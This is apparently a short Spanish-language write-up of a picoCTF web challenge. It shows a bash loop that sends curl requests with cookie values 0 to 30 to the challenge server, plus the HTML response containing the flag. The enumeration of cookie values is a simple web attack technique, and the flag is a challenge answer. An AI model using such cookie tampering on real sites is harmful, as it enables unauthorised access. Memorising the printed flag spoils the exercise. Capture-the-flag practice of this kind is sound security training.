### Descripcion

### Solucion
Hacer un curl a la página de manera repetitiva e ir iterando por los diferentes nombres de las galletas hasta encontrar la flag haciendo uso tambien de curl
```bash
for i in {0..30}; do curl http://mercury.picoctf.net:21485/check -H "Cookie: name=$i" | grep "picoCTF"; done
```
```html
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
```
### Tags
